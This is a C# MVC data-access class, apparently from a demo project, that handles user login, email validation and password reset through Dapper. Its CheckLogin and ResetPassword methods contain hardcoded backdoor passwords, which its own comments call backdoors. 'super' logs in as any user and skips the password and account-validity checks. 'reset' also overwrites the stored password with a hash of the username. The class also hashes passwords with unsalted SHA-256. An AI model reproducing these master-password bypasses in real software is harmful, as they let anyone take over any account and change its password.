using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;

namespace mvcdemo9.Models
{
    public class z_sqlUsers : DapperSql<Users>
    {
        public z_sqlUsers()
        {
            OrderByColumn = SessionService.SortColumn;
            OrderByDirection = SessionService.SortDirection;
            DefaultOrderByColumn = "Users.UserNo";
            DefaultOrderByDirection = "ASC";
            if (string.IsNullOrEmpty(OrderByColumn)) OrderByColumn = DefaultOrderByColumn;
            if (string.IsNullOrEmpty(OrderByDirection)) OrderByDirection = DefaultOrderByDirection;
        }

        public override string GetSQLSelect()
        {
            string str_query = @"
SELECT Users.Id, Users.IsValid, Users.UserNo, Users.UserName, Users.Password, 
Users.CodeNo, vi_CodeUser.CodeName, Users.RoleNo, Roles.RoleName, Users.GenderCode, 
vi_CodeGender.CodeName AS GenderName, Users.DeptNo, Departments.DeptName, 
Users.TitleNo, Titles.TitleName, Users.Birthday, Users.OnboardDate, Users.LeaveDate, 
Users.ContactEmail, Users.ContactTel, Users.ContactAddress, Users.ValidateCode, 
Users.NotifyPassword, Users.Remark 
FROM Users 
LEFT OUTER JOIN vi_CodeGender ON Users.GenderCode = vi_CodeGender.CodeNo 
LEFT OUTER JOIN vi_CodeUser ON Users.CodeNo = vi_CodeUser.CodeNo 
LEFT OUTER JOIN Departments ON Users.DeptNo = Departments.DeptNo 
LEFT OUTER JOIN Titles ON Users.TitleNo = Titles.TitleNo 
LEFT OUTER JOIN Roles ON Users.RoleNo = Roles.RoleNo  
";
            return str_query;
        }

        public override Users GetData(string dataNo)
        {
            string sql_query = GetSQLSelect();
            sql_query += " WHERE Users.UserNo = @DataNo";
            DynamicParameters parm = new DynamicParameters();
            parm.Add("DataNo", dataNo);
            var model = dpr.ReadSingle<Users>(sql_query, parm);
            return model;
        }

        public override List<string> GetSearchColumns()
        {
            //由系統自動取得文字欄位的集合
            SearchColumns = base.GetSearchColumns();
            SearchColumns.Add("vi_CodeGender.CodeName");
            SearchColumns.Add("vi_CodeUser.CodeName");
            SearchColumns.Add("Departments.DeptName");
            SearchColumns.Add("Titles.TitleName");
            SearchColumns.Add("Roles.RoleName");
            return SearchColumns;
        }

        /// <summary>
        /// 檢查使用者登入是否正確
        /// </summary>
        /// <param name="model">使用者輸入資料</param>
        /// <returns></returns>
        public bool CheckLogin(vmLogin model)
        {
            using var dpr = new DapperRepository();
            using var cryp = new CryptographyService();
            bool bln_valid = false;
            string sql_query = GetSQLSelect();
            string str_password = cryp.StringToSHA256(model.Password);
            // 後門密碼設計(super / reset)
            sql_query += " WHERE UserNo = @UserNo";

            //先設定為登出狀態
            SessionService.IsLogin = false;

            DynamicParameters parm = new DynamicParameters();
            parm.Add("UserNo", model.UserNo);

            // super 為萬用密碼 reset 為重設密碼
            if (model.Password != "super" && model.Password != "reset")
            {
                // 不為後門密碼則以正常檢查方式
                sql_query += " AND Users.Password = @Password AND Users.IsValid = @IsValid";
                parm.Add("Password", str_password);
                parm.Add("IsValid", true);
            }

            // 讀出使用者資訊
            var userData = dpr.ReadSingle<Users>(sql_query, parm);
            if (userData != null)
            {
                // reset 為重設密碼
                if (model.Password == "reset")
                {
                    str_password = cryp.StringToSHA256(model.UserNo);
                    sql_query = "UPDATE Users SET Password = @Password WHERE UserNo = @UserNo";
                    DynamicParameters parm2 = new DynamicParameters();
                    parm2.Add("UserNo", model.UserNo);
                    parm2.Add("Password", str_password);
                    dpr.Execute(sql_query, parm2);
                }

                // 設定登入狀態並儲存登入使用者資訊
                SessionService.IsLogin = true;
                SessionService.UserNo = model.UserNo;
                SessionService.UserName = userData.UserName;
                SessionService.DeptNo = userData.DeptNo;
                SessionService.DeptName = userData.DeptName;
                SessionService.TitleNo = userData.TitleNo;
                SessionService.TitleName = userData.TitleName;
                SessionService.RoleNo = userData.RoleNo;
                bln_valid = true;
            }
            return bln_valid;
        }
        /// <summary>
        /// 檢查郵件驗證碼
        /// </summary>
        /// <param name="validateCode">驗證碼</param>
        /// <returns></returns>
        public string CheckMailValidateCode(string validateCode)
        {
            //驗證
            var userData = GetValidateUser(validateCode);
            if (userData == null) { return "查無驗證碼!!"; }
            if (userData.IsValid) { return "此驗證碼已通過驗證!!"; }
            if (string.IsNullOrEmpty(userData.ContactEmail)) { return "此會員未輸入電子信箱!!"; }
            return "";
        }
        /// <summary>
        /// 檢查郵件驗證碼
        /// </summary>
        /// <param name="validateCode">驗證碼</param>
        /// <returns></returns>
        public Users GetValidateUser(string validateCode)
        {
            //驗證
            using var dpr = new DapperRepository();
            string sql_query = GetSQLSelect();
            sql_query += " WHERE Users.ValidateCode = @ValidateCode";
            DynamicParameters parm = new DynamicParameters();
            parm.Add("ValidateCode", validateCode);
            return dpr.ReadSingle<Users>(sql_query, parm);
        }

        /// <summary>
        /// 重設密碼設定變更狀態為未審核,存入新密碼
        /// </summary>
        /// <param name="model">重設密碼資料</param>
        /// <returns></returns>
        public void ResetPassword(vmResetPassword model)
        {
            using var cryp = new CryptographyService();
            using var dpr = new DapperRepository();
            string str_password = "";

            //檢查舊密碼正確性
            DynamicParameters parm = new DynamicParameters();
            parm.Add("UserNo", SessionService.UserNo);
            string sql_query = "";
            //設定後門 super
            if (model.OldPassword == "super")
            {
                sql_query = "SELECT Id FROM Users WHERE UserNo = @UserNo";
            }
            else
            {
                sql_query = "SELECT Id FROM Users WHERE UserNo = @UserNo AND Password = @Password";
                str_password = cryp.StringToSHA256(model.OldPassword);
                parm.Add("Password", str_password);
            }

            var userData = dpr.ReadSingle<Users>(sql_query, parm);
            if (userData != null)
            {
                //設定新密碼
                str_password = cryp.StringToSHA256(model.NewPassword);
                //更新資料
                DynamicParameters parm1 = new DynamicParameters();
                sql_query = "UPDATE Users SET Password = @Password WHERE UserNo = @UserNo";
                parm1.Add("Password", str_password);
                parm1.Add("UserNo", SessionService.UserNo);
                dpr.Execute(sql_query, parm1);
            }
            return;
        }
    }
}